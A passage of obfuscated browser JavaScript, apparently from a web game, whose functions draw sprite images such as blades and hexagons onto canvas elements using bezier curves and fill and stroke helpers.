			Δ.bezierCurveTo(ᐃ * 114, 94 * ᐃ, ᐃ * 47, 91 * ᐃ, ᐃ * 28, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[2], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 27, ᐃ * 69);
			Δ.bezierCurveTo(13 * ᐃ, 77 * ᐃ, ΔⵠⲆⵠᐃⵠⲆ * ᐃ, 74 * ᐃ, ᐃ * 27, 80 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃΔ], Ⲇᐃ[2], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(145 * ᐃ, 70 * ᐃ);
			Δ.bezierCurveTo(149.5 * ᐃ, 72 * ᐃ, 149.5 * ᐃ, ᐃ * 72, 154 * ᐃ, ᐃ * 74);
			Δ.bezierCurveTo(ᐃ * 150, ᐃ * 77, 150 * ᐃ, ᐃ * 77, ᐃ * 146, 80 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠⵠ], Ⲇᐃ[ⵠⵠⵠΔ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, 50 * ᐃ, 80 * ᐃ, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔΔΔ], Ⲇᐃ[ⲆⲆΔᐃ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, 86.01141357421875 * ᐃ, 81.76705932617188 * ᐃ, ᐃ * ᐃⲆⵠⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⲆΔⵠ], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 4);
			ⵠᐃᐃ(Δ, ᐃ * 119.01141357421875, ᐃ * 80.13069152832031, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔᐃⲆΔΔ], Ⲇᐃ[ᐃⲆⵠᐃΔ], ΔⲆᐃⵠᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ⲆΔⵠⲆΔᐃΔⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 65;
			Ⲇⵠ.height = 131 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔⲆ;
			Δ.translate(ⵠΔΔΔΔ, 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(21.25 * ᐃ, ᐃ * 88.9375);
			Δ.bezierCurveTo(19.25 * ᐃ, 57.9375 * ᐃ, 19.25 * ᐃ, ᐃ * 57.9375, 17.25 * ᐃ, 26.9375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 24.25, 20.9375 * ᐃ, ᐃ * 24.25, ᐃ * 20.9375, 31.25 * ᐃ, ᐃ * 14.9375);
			Δ.bezierCurveTo(32.75 * ᐃ, 54.4375 * ᐃ, ᐃ * 32.75, ᐃ * 54.4375, ᐃ * 34.25, ᐃ * 93.9375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 30.25, ᐃ * 5.9375);
			Δ.bezierCurveTo(ᐃ * 39.25, 14.9375 * ᐃ, 39.25 * ᐃ, 14.9375 * ᐃ, 48.25 * ᐃ, ᐃ * 23.9375);
			Δ.bezierCurveTo(44.75 * ᐃ, 56.4375 * ᐃ, ᐃ * 44.75, ᐃ * 56.4375, ᐃ * 41.25, ᐃ * 88.9375);
			Δ.bezierCurveTo(ᐃ * 36.25, 88.9375 * ᐃ, ᐃ * 36.25, 88.9375 * ᐃ, ᐃ * 31.25, 88.9375 * ᐃ);
			Δ.bezierCurveTo(30.75 * ᐃ, 47.9375 * ᐃ, 30.75 * ᐃ, 47.9375 * ᐃ, ᐃ * 30.25, 6.9375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δᐃᐃⵠ], ⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(7.25 * ᐃ, ᐃ * 85.4375);
			Δ.bezierCurveTo(31.75 * ᐃ, ᐃ * 85.4375, 31.75 * ᐃ, ᐃ * 85.4375, 56.25 * ᐃ, ᐃ * 85.4375);
			Δ.bezierCurveTo(ᐃ * 51.25, 91.9375 * ᐃ, ᐃ * 51.25, ᐃ * 91.9375, 46.25 * ᐃ, ᐃ * 98.4375);
			Δ.bezierCurveTo(30.25 * ᐃ, 98.4375 * ᐃ, 30.25 * ᐃ, ᐃ * 98.4375, ᐃ * 14.25, 98.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[0], 4 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 31.25, 108.9375 * ᐃ);
			Ⲇᐃᐃ(Δ, -Δⵠᐃᐃⵠ * ᐃ, ᐃ * -14.5, 12 * ᐃ, 29 * ᐃ, ᐃ * 10);
			Δ.restore();
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.translate(-ⵠⵠⵠⵠ, 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(21.25 * ᐃ, 88.9375 * ᐃ);
			Δ.bezierCurveTo(19.25 * ᐃ, ᐃ * 57.9375, ᐃ * 19.25, 57.9375 * ᐃ, ᐃ * 17.25, 26.9375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 24.25, ᐃ * 20.9375, 24.25 * ᐃ, 20.9375 * ᐃ, 31.25 * ᐃ, ᐃ * 14.9375);
			Δ.bezierCurveTo(32.75 * ᐃ, ᐃ * 54.4375, ᐃ * 32.75, ᐃ * 54.4375, 34.25 * ᐃ, 93.9375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(30.25 * ᐃ, ᐃ * 5.9375);
			Δ.bezierCurveTo(39.25 * ᐃ, ᐃ * 14.9375, ᐃ * 39.25, 14.9375 * ᐃ, 48.25 * ᐃ, 23.9375 * ᐃ);
			Δ.bezierCurveTo(44.75 * ᐃ, 56.4375 * ᐃ, 44.75 * ᐃ, 56.4375 * ᐃ, ᐃ * 41.25, 88.9375 * ᐃ);
			Δ.bezierCurveTo(36.25 * ᐃ, 88.9375 * ᐃ, 36.25 * ᐃ, ᐃ * 88.9375, 31.25 * ᐃ, 88.9375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30.75, ᐃ * 47.9375, 30.75 * ᐃ, 47.9375 * ᐃ, 30.25 * ᐃ, ᐃ * 6.9375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ΔⲆᐃᐃ], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 7.25, 85.4375 * ᐃ);
			Δ.bezierCurveTo(31.75 * ᐃ, ᐃ * 85.4375, 31.75 * ᐃ, 85.4375 * ᐃ, ᐃ * 56.25, 85.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51.25, ᐃ * 91.9375, ᐃ * 51.25, 91.9375 * ᐃ, 46.25 * ᐃ, 98.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30.25, 98.4375 * ᐃ, 30.25 * ᐃ, ᐃ * 98.4375, 14.25 * ᐃ, 98.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ], Ⲇᐃ[5], Ⲇⵠⵠⵠ * ᐃ);
			Δ.save();
			Δ.translate(31.25 * ᐃ, 108.9375 * ᐃ);
			Ⲇᐃᐃ(Δ, -6 * ᐃ, ᐃ * -14.5, 12 * ᐃ, ᐃ * 29, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31.25 * ᐃ, ᐃ * 73.4375);
			Δ.bezierCurveTo(ᐃ * 33.25, ᐃ * 77.9375, 33.25 * ᐃ, ᐃ * 77.9375, 35.25 * ᐃ, 82.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.25, 87.4375 * ᐃ, 33.25 * ᐃ, 87.4375 * ᐃ, ᐃ * 31.25, ᐃ * 92.4375);
			Δ.bezierCurveTo(ᐃ * 29.25, 87.9375 * ᐃ, 29.25 * ᐃ, ᐃ * 87.9375, ᐃ * 27.25, 83.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[1], ⵠΔᐃᐃⵠ * ᐃ);
			return Ⲇⵠ
		}

		function ⲆΔⲆΔΔⵠⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 85;
			Ⲇⵠ.height = 145 * ᐃ;
			Δ.translate(ᐃ * -165, -95 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 217, 103 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 209, ᐃ * 129, ᐃ * 203, 137 * ᐃ, 195 * ᐃ, 146 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 195, ᐃ * 159, 194 * ᐃ, ᐃ * 167, 189 * ᐃ, ᐃ * 178);
			Δ.bezierCurveTo(ᐃ * 193, 186 * ᐃ, 196 * ᐃ, ᐃ * 195, ᐃ * 198, 216 * ᐃ);
			Δ.bezierCurveTo(217.5 * ᐃ, 189.5 * ᐃ, 217.5 * ᐃ, 189.5 * ᐃ, ᐃ * 237, ᐃ * 163);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 231, ᐃ * 163);
			Δ.bezierCurveTo(221 * ᐃ, ᐃ * 139, ᐃ * 218, ᐃ * 128, ᐃ * 215, 114 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 213, 102 * ᐃ, 220 * ᐃ, 92 * ᐃ, 222 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 224, ᐃ * 118, ᐃ * 233, ᐃ * 138, ᐃ * 244, 161 * ᐃ);
			Δ.bezierCurveTo(235 * ᐃ, 188 * ᐃ, 224 * ᐃ, ᐃ * 198, ᐃ * 204, ᐃ * 221);
			Δ.bezierCurveTo(ᐃ * 190, ᐃ * 233, 190 * ᐃ, 235 * ᐃ, 180 * ᐃ, ᐃ * 235);
			Δ.bezierCurveTo(ᐃ * 167, 235 * ᐃ, ᐃ * 164, ᐃ * 216, 175 * ᐃ, ᐃ * 211);
			Δ.bezierCurveTo(ᐃ * 176, ᐃ * 208, 181 * ᐃ, 207 * ᐃ, ᐃ * 191, ᐃ * 205);
			Δ.bezierCurveTo(213 * ᐃ, 186 * ᐃ, ᐃ * 218, ᐃ * 180, 230 * ᐃ, 163 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * ΔΔⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 234, 154 * ᐃ);
			Δ.bezierCurveTo(227 * ᐃ, ᐃ * 156, 222 * ᐃ, 156 * ᐃ, ᐃ * 199, ᐃ * 148);
			Δ.bezierCurveTo(201 * ᐃ, 151 * ᐃ, ᐃ * 216, ᐃ * 159, ᐃ * 224, 162 * ᐃ);
			Δ.bezierCurveTo(209 * ᐃ, 169.5 * ᐃ, 209 * ᐃ, ᐃ * 169.5, ᐃ * 194, ᐃ * 177);
			Δ.bezierCurveTo(213.5 * ᐃ, ᐃ * 175, 213.5 * ᐃ, ᐃ * 175, ᐃ * 233, 173 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ]);
			return Ⲇⵠ
		}

		function ΔᐃⲆΔⲆᐃⵠΔᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 254 * ᐃ;
			Ⲇⵠ.height = 288 * ᐃ;
			Δ.translate(ⲆΔⵠ, 5);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 218, 84.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 150, 13.640625 * ᐃ, 186 * ᐃ, ᐃ * 92.640625, ᐃ * 168, ᐃ * 103.640625);
			Δ.bezierCurveTo(151 * ᐃ, ᐃ * 107.640625, 150 * ᐃ, 61.640625 * ᐃ, ᐃ * 144, 39.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135, 1.640625 * ᐃ, 113 * ᐃ, 2.640625 * ᐃ, 110 * ᐃ, ᐃ * 40.640625);
			Δ.bezierCurveTo(ᐃ * 106, 97.640625 * ᐃ, ᐃ * 98, ᐃ * 102.640625, ᐃ * 83, ᐃ * 100.640625);
			Δ.bezierCurveTo(68 * ᐃ, 98.640625 * ᐃ, 67 * ᐃ, 77.640625 * ᐃ, ᐃ * 70, ᐃ * 55.640625);
			Δ.bezierCurveTo(75 * ᐃ, ᐃ * 16.640625, ᐃ * 47, ᐃ * 52.640625, ᐃ * 38, ᐃ * 67.640625);
			Δ.bezierCurveTo(ᐃ * 10, 113.640625 * ᐃ, 10 * ᐃ, 181.640625 * ᐃ, 23 * ᐃ, 213.640625 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, ᐃ * 266.640625, ᐃ * 97, ᐃ * 277.640625, ᐃ * 147, 269.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 217, ᐃ * 259.640625, 236 * ᐃ, 221.640625 * ᐃ, 239 * ᐃ, 166.640625 * ᐃ);
			Δ.bezierCurveTo(239 * ᐃ, 113.640625 * ᐃ, 223 * ᐃ, 90.640625 * ᐃ, 219 * ᐃ, 86.640625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ΔᐃⵠⵠⲆ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 175, ᐃ * 220.640625, 29.546573405388315 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, 79 * ᐃ, ᐃ * 222.640625, ᐃ * 28.178005607210743);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, ᐃ * 175, 214.640625 * ᐃ, ᐃ * 27.892651361962706);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[Ⲇᐃⵠⵠ], ⲆⵠΔⵠ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 79, 215.640625 * ᐃ, ᐃ * 26.570660511172846);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[Ⲇᐃⵠⵠ], 4 * ᐃ);
			Δ.translate(0, -ⲆⲆΔⵠ);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 218, ᐃ * 84.640625);
			Δ.bezierCurveTo(150 * ᐃ, 13.640625 * ᐃ, ᐃ * 186, 92.640625 * ᐃ, ᐃ * 168, ᐃ * 103.640625);
			Δ.bezierCurveTo(ᐃ * 151, 107.640625 * ᐃ, 150 * ᐃ, ᐃ * 61.640625, 144 * ᐃ, ᐃ * 39.640625);
			Δ.bezierCurveTo(135 * ᐃ, ᐃ * 1.640625, ᐃ * 113, ᐃ * 2.640625, ᐃ * 110, ᐃ * 40.640625);
			Δ.bezierCurveTo(106 * ᐃ, ᐃ * 97.640625, 98 * ᐃ, ᐃ * 102.640625, ᐃ * 83, 100.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, ᐃ * 98.640625, 67 * ᐃ, 77.640625 * ᐃ, ᐃ * 70, ᐃ * 55.640625);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 16.640625, 47 * ᐃ, ᐃ * 52.640625, 38 * ᐃ, 67.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃⵠᐃΔⵠ * ᐃ, 113.640625 * ᐃ, ᐃ * 10, 181.640625 * ᐃ, 23 * ᐃ, ᐃ * 213.640625);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 266.640625, 97 * ᐃ, ᐃ * 277.640625, 147 * ᐃ, 269.640625 * ᐃ);
			Δ.bezierCurveTo(217 * ᐃ, ᐃ * 259.640625, ᐃ * 236, 221.640625 * ᐃ, 239 * ᐃ, 166.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 239, 113.640625 * ᐃ, ᐃ * 223, ᐃ * 90.640625, 219 * ᐃ, ᐃ * 86.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			ⵠᐃᐃ(Δ, 175 * ᐃ, 222.640625 * ᐃ, ᐃ * 26.546573405388315);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			ⵠᐃᐃ(Δ, ᐃ * 79, ᐃ * 222.640625, ᐃ * 26.178005607210743);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ]);
			ⵠᐃᐃ(Δ, 175 * ᐃ, 210.640625 * ᐃ, 26.892651361962706 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ], Ⲇᐃ[5], ᐃ * 8);
			ⵠᐃᐃ(Δ, ᐃ * 79, ᐃ * 210.640625, 26.570660511172846 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 8 * ᐃ);
			return Ⲇⵠ
		}

		function ΔᐃΔᐃⲆⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 89 * ᐃ;
			Ⲇⵠ.height = ᐃ * 89;
			Δ.save();
			Δ.translate(44.5 * ᐃ, 44.5 * ᐃ);
			ⵠΔⵠᐃ(Δ, 6, 40 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 44.5, 44.5 * ᐃ);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 25.11521001172521, ᐃΔⲆᐃⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], 5 * ᐃ);
			return Ⲇⵠ
		}

		function ΔⲆᐃᐃΔⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 104;
			Ⲇⵠ.height = 117 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(4 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 20, 99.5 * ᐃ, ᐃΔⲆⵠᐃ * ᐃ, 99.5 * ᐃ, 36 * ᐃ, 109 * ᐃ);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 92, 67 * ᐃ, ᐃ * 92, 98 * ᐃ, 75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 91, ᐃ * 27, ᐃ * 91, 27 * ᐃ, 91 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(72.5 * ᐃ, ΔΔᐃᐃΔ * ᐃ, 72.5 * ᐃ, ᐃᐃᐃᐃⲆᐃᐃ * ᐃ, 54 * ᐃ, 4 * ᐃ);
			Δ.bezierCurveTo(33.5 * ᐃ, ΔᐃⲆⲆⵠ * ᐃ, 33.5 * ᐃ, ⵠⲆⲆᐃⵠ * ᐃ, ᐃ * 13, 16 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * ᐃⵠΔⵠⲆⲆⲆ, 76 * ᐃ);
			Δ.bezierCurveTo(13.5 * ᐃ, ᐃ * 51.5, ᐃ * 13.5, 51.5 * ᐃ, 21 * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(37.5 * ᐃ, ᐃ * ⲆᐃᐃⲆΔ, 37.5 * ᐃ, ᐃ * 17, 54 * ᐃ, ⵠⵠⲆⲆⵠ * ᐃ);
			Δ.bezierCurveTo(33.5 * ᐃ, ᐃ * 12.5, ᐃ * 33.5, 12.5 * ᐃ, 13 * ᐃ, ᐃᐃᐃᐃⲆ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(24 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(28.5 * ᐃ, ᐃ * 53, ᐃ * 28.5, ᐃ * 53, ᐃ * 33, ᐃ * 44);
			Δ.bezierCurveTo(41.5 * ᐃ, 41 * ᐃ, ᐃ * 41.5, 41 * ᐃ, ᐃ * 50, 38 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52.5, ᐃ * 35, ᐃ * 52.5, ᐃ * 35, 55 * ᐃ, ᐃ * 32);
			Δ.bezierCurveTo(ᐃ * 52, 30 * ᐃ, 52 * ᐃ, 30 * ᐃ, 49 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(38 * ᐃ, 31.5 * ᐃ, 38 * ᐃ, ᐃ * 31.5, 27 * ᐃ, ᐃ * 35);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(36 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 66, 90.5 * ᐃ, 66 * ᐃ, ᐃ * 90.5, ᐃ * 96, ᐃ * 74);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 52.5, ᐃ * 93, ᐃ * 52.5, 90 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(87 * ᐃ, 48 * ᐃ, ᐃ * 87, ᐃ * 48, ᐃ * 84, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 1, ᐃ * 89);
			Δ.bezierCurveTo(18 * ᐃ, 100 * ᐃ, ᐃ * 34, ᐃ * 110, ᐃ * 35, 111 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67, 93 * ᐃ, ᐃ * 67, 93 * ᐃ, ᐃ * 99, ᐃ * 75);
			Δ.bezierCurveTo(100 * ᐃ, 78.5 * ᐃ, 100 * ᐃ, ᐃ * 78.5, ᐃ * 101, ᐃ * 82);
			Δ.bezierCurveTo(68 * ᐃ, ᐃ * 99, ᐃ * 68, ᐃ * 99, ᐃ * 35, 116 * ᐃ);
			Δ.bezierCurveTo(ⲆⲆΔⲆⵠᐃᐃ * ᐃ, ᐃ * 106.5, ⲆⲆⵠᐃⲆⵠⲆ * ᐃ, 106.5 * ᐃ, ⵠᐃⵠΔ * ᐃ, ᐃ * 97);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(36 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(66.5 * ᐃ, 91.5 * ᐃ, 66.5 * ᐃ, ᐃ * 91.5, 97 * ᐃ, ᐃ * 76);
			Δ.bezierCurveTo(ᐃ * 94.5, ᐃ * 52, 94.5 * ᐃ, 52 * ᐃ, 92 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(ᐃ * 73, 15.5 * ᐃ, ᐃ * 73, 15.5 * ᐃ, ᐃ * 54, ᐃⵠⲆΔᐃ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33, 9.5 * ᐃ, 33 * ᐃ, 9.5 * ᐃ, 12 * ᐃ, ᐃ * 16);
			Δ.bezierCurveTo(ᐃⵠⲆᐃᐃ * ᐃ, ᐃ * 53, ᐃ * 8, ᐃ * 53, Ⲇⵠⵠⵠ * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 18.5, ᐃ * 99, ᐃ * 18.5, ᐃ * 99, 33 * ᐃ, ᐃ * 108);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * ⵠⵠⵠⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 22, ᐃ * 71);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 76.5, 30 * ᐃ, ᐃ * 76.5, 38 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(53 * ᐃ, 72 * ᐃ, 53 * ᐃ, ᐃ * 72, 68 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(68 * ᐃ, 52 * ᐃ, ᐃ * 68, 52 * ᐃ, ᐃ * 68, 42 * ᐃ);
			Δ.bezierCurveTo(59.5 * ᐃ, ᐃ * 35.5, ᐃ * 59.5, 35.5 * ᐃ, 51 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(39.5 * ᐃ, ᐃ * 32, 39.5 * ᐃ, 32 * ᐃ, ᐃ * 28, 35 * ᐃ);
			Δ.bezierCurveTo(25 * ᐃ, ᐃ * 52, 25 * ᐃ, ᐃ * 52, 22 * ᐃ, ᐃ * 69);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * ΔᐃⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 5, ᐃ * 89);
			Δ.bezierCurveTo(ᐃ * ⲆⲆⲆⵠΔ, ᐃ * 73, 12.5 * ᐃ, ᐃ * 80.5, ᐃ * ⲆΔⲆⲆΔ, 72 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔᐃᐃᐃ, Ⲇᐃ[4], ⵠᐃᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 35, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 36, ᐃ * 92.5, 36 * ᐃ, ᐃ * 92.5, ᐃ * 37, ᐃ * 83);
			Δ.closePath();
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[ΔⲆᐃⵠᐃ], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 68, ᐃ * 62);
			Δ.bezierCurveTo(81 * ᐃ, 67.5 * ᐃ, ᐃ * 81, 67.5 * ᐃ, ᐃ * 94, 73 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[4], ᐃ * ᐃⵠΔⵠⲆⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(70 * ᐃ, ᐃ * 41);
